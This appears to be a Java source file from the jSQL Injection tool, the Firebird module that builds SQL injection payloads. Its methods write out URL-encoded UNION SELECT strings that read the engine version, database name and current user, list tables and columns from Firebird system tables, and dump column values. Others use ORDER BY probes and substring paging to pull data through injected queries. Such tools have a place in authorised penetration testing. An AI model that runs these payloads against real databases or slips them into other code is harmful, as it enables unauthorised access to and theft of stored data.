package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class FirebirdStrategy extends ASQLStrategy {

    @Override
    public String getSchemaInfos() {
        return
            "SELECT+rdb$get_context('SYSTEM','ENGINE_VERSION')||'{%}'||rdb$get_context('SYSTEM','DB_NAME')"
            + "||'{%}'||rdb$get_context('SYSTEM','CURRENT_USER')||'{%}-%01%03%03%07'from+rdb$database";
    }

    @Override
    public String getSchemaList() {
        return
            /**
             * aggreg function return exec fault
             * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
             * => use limit 1,1 instead
             */
            "select+'%04'||rdb$get_context('SYSTEM','DB_NAME')||'%050%04%01%03%03%07'from+rdb$database{limit}";
    }

    @Override
    public String getTableList(Database database) {
        return
            "SELECT'%04'||trim(rdb$relation_name)||'%050%04%01%03%03%07'from+rdb$relations{limit}";

    }

    @Override
    public String getColumnList(Table table) {
        return
            "SELECT'%04'||trim(rdb$field_name)||'%050%04%01%03%03%07'from+rdb$relation_fields+where+rdb$relation_name='" + table + "'{limit}";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, ",''))||'%7f'||trim(coalesce(");
        formatListColumn = "trim(coalesce(" + formatListColumn + ",''))";
        
        return
            "SELECT'%04'||" + formatListColumn + "||'%050%04%01%03%03%07'from+" + table + "{limit}";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return
            "select+" +
                /**
                 * If reach end of string (SQLii) then NULLIF nullifies the result
                 */
                 "'SQLi'||NULLIF(substring(" +
                 "(" + sqlQuery + ")from+" +
                 startPosition + "+for+" +
                 "65536" +
             "),'%01%03%03%07')from+RDB$DATABASE";
     }

     @Override
     public String getIndicesCapacity(String[] indexes) {
         return
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
                 "(select+'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'from+RDB\\$DATABASE)"
             );
     }

    @Override
    public String getIndices(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("(1337"+ i +"7330%2b1)");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from+RDB$DATABASE--+";
    }

    @Override
    public String getOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+ROWS+" + (limitSQLResult+1) + "+TO+" + (limitSQLResult+1) + "";
    }
    
    @Override
    public String getDbLabel() {
        return "Firebird";
    }
}